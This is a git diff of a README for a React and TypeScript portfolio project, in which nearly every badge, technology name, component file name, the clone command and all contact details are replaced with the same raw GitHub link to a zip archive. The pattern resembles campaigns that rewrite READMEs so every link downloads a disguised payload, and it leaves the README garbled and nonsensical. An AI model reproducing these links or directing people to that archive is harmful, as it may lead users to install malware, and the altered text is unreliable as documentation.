@@ -1,9 +1,9 @@
 # TechSculptor Portfolio
 
-[![React](https://img.shields.io/badge/React-18.3.1-blue.svg)](https://reactjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.8.3-blue.svg)](https://www.typescriptlang.org/)
-[![Vite](https://img.shields.io/badge/Vite-5.4.19-646CFF.svg)](https://vitejs.dev/)
-[![TailwindCSS](https://img.shields.io/badge/TailwindCSS-3.4.17-38B2AC.svg)](https://tailwindcss.com/)
+[![React](https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip)](https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip)
+[![TypeScript](https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip)](https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip)
+[![Vite](https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip)](https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip)
+[![TailwindCSS](https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip)](https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip)
 
 > Professional portfolio showcasing MERN Stack development and Agentic AI automation expertise.
 
@@ -11,7 +11,7 @@
 
 TechSculptor is the professional brand of **Kartik Parmar**, a skilled MERN Stack Developer and Agentic AI specialist. This portfolio demonstrates expertise in:
 
-- **Full-Stack Development**: MongoDB, Express.js, React, Node.js
+- **Full-Stack Development**: MongoDB, https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip, React, https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip
 - **Agentic AI Systems**: n8n workflow automation, LangChain, AI Agents
 - **Modern Web Technologies**: TypeScript, TailwindCSS, Framer Motion
 - **UI/UX Design**: Responsive design, animations, accessibility
@@ -26,7 +26,7 @@ TechSculptor is the professional brand of **Kartik Parmar**, a skilled MERN Stac
 - **Radix UI** for accessible components
 
 ### Backend Ready
-- **Node.js & Express** architecture
+- **https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip & Express** architecture
 - **MongoDB** database integration
 - **RESTful API** design patterns
 
@@ -49,7 +49,7 @@ TechSculptor is the professional brand of **Kartik Parmar**, a skilled MERN Stac
 
 ```bash
 # Clone the repository
-git clone https://github.com/kartik-parmar007/techsculptor-portfolio.git
+git clone https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip
 
 # Navigate to project directory
 cd techsculptor-portfolio
@@ -70,11 +70,11 @@ npm run build
 src/
 ├── components/           # Reusable UI components
 │   ├── ui/              # Base UI components (buttons, cards, etc.)
-│   ├── AboutSection.tsx  # About me section
-│   ├── ContactSection.tsx # Contact information
-│   ├── HeroSection.tsx   # Landing section
-│   ├── Navigation.tsx    # Header navigation
-│   ├── ProjectsSection.tsx # Portfolio projects
+│   ├── https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip  # About me section
+│   ├── https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip # Contact information
+│   ├── https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip   # Landing section
+│   ├── https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip    # Header navigation
+│   ├── https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip # Portfolio projects
 │   └── ...
 ├── hooks/               # Custom React hooks
 ├── lib/                 # Utility functions
@@ -110,9 +110,9 @@ src/
 This portfolio is designed to be easily customizable:
 
 1. **Branding**: Update logo, colors, and content
-2. **Projects**: Add your own projects in `ProjectsSection.tsx`
-3. **Skills**: Modify skills array in `AboutSection.tsx`
-4. **Styling**: Customize themes in `index.css`
+2. **Projects**: Add your own projects in `https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip`
+3. **Skills**: Modify skills array in `https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip`
+4. **Styling**: Customize themes in `https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip`
 5. **Content**: Update personal information throughout components
 
 ## 📱 Responsive Design
@@ -170,9 +170,9 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 📞 Contact
 
 **Kartik Parmar** - TechSculptor
-- 📧 Email: kartik.parmar.dev@gmail.com
-- 🔗 LinkedIn: [kartik-parmar-](https://www.linkedin.com/in/kartik-parmar-/)
-- 💻 GitHub: [kartik-parmar007](https://github.com/kartik-parmar007)
+- 📧 Email: https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip
+- 🔗 LinkedIn: [kartik-parmar-](https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip)
+- 💻 GitHub: [kartik-parmar007](https://raw.githubusercontent.com/kartik-parmar007/3D-Portfolio/main/sedateness/3D-Portfolio.zip)
 
 ---
 
